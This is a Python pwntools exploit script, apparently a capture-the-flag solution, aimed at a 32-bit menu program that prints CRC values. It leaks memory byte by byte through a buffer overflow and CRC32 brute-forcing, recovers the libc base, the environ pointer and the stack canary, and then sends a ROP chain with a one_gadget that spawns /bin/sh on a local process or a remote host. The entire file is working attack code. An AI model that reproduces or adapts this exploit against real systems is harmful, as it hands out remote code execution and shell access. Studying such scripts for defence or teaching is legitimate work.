#!/usr/bin/env python

from pwn import *
import sys
import binascii


def brute(val):
    val = val.lower()
    for i in range(0,256):
        crc = hex(binascii.crc32(chr(i))&0xffffffff)
        if crc == val:
            return i
    log.error("could'nt brute %s" % val)
    raise Exception("failed")

def get_crc(r, addr):
    r.recvuntil(" Choice:")

    buf = ""
    buf += "1\n1\n"
    buf += "a"*100
    buf += p32(addr)
    buf += "\n"
    r.send(buf)

    r.recvuntil("CRC is: ")
    return r.recvline().strip()

def leak_and_brute(r, addr):

    # the following ascii characters seem to break the leaking
    # 0x08: backspace
    # 0x09: horizontal tab
    # 0x0a: \n
    value = get_crc(r, addr)
    return brute(value)

def leak_four(r, addr):
    val = (leak_and_brute(r, addr))
    val = (leak_and_brute(r, addr+1) << 8) + val
    val = (leak_and_brute(r, addr+2) << 16) + val
    val = (leak_and_brute(r, addr+3) << 24) + val
    return val

def own(r, canary):
    r.recvuntil(" Choice:")
    r.send("a"*40)
    r.send(p32(canary))
    r.send("b"*12)
    r.send(p32(ESI_GADGET))
    r.send(p32(libc_base + LIBC_RWP_OFFSET))
    r.send(p32(0xdeadbeef))
    r.send(p32(0xdeadbeef))
    r.send(p32(libc_base + ONE_GADGET))
    r.send("\n")
    r.interactive()

if len(sys.argv) == 3:
    r = remote(sys.argv[1], int(sys.argv[2]))
else:
    r = process(sys.argv[1])

LIBC_OFFSET = 0x5f3e0       # subtract this from the got entry we read to get libc base
ENVIRON_OFFSET = 0x1fb8fc   # add this to libc base to get address of pointer to _environ
SEARCH_RANGE = 0x2000       # the range to search on the stack (from _environ)


# ROP
# 0x5fbc5 execl("/bin/sh", eax)
# constraints:
#   esi is the address of `rw-p` area of libc
#   eax == NULL
ONE_GADGET = 0x5fbc5
LIBC_RWP_OFFSET = 0x1b2000 # offset from libc base to RWP section
ESI_GADGET = 0x08048850 # pop esi; pop edi; pop ebp; ret;


libc_base = leak_four(r, 0x8049fdc) - LIBC_OFFSET
log.success("libc:     0x%x" % libc_base)

environ_ptr = leak_four(r, libc_base + ENVIRON_OFFSET)
log.success("_environ: 0x%x" % environ_ptr)

canary = leak_four(r, environ_ptr-0xd0)
log.success("canary:   0x%x" % canary)

# exploit
buf = ""
buf += "a"*40
buf += p32(canary)
buf += "b"*12
buf += p32(ESI_GADGET)
buf += p32(libc_base + LIBC_RWP_OFFSET)
buf += p32(0xdeadbeef)
buf += p32(0xdeadbeef)
buf += p32(libc_base + ONE_GADGET)
buf += "\n"

r.recvuntil(" Choice:")
r.send(buf)
r.interactive()


exit(1)
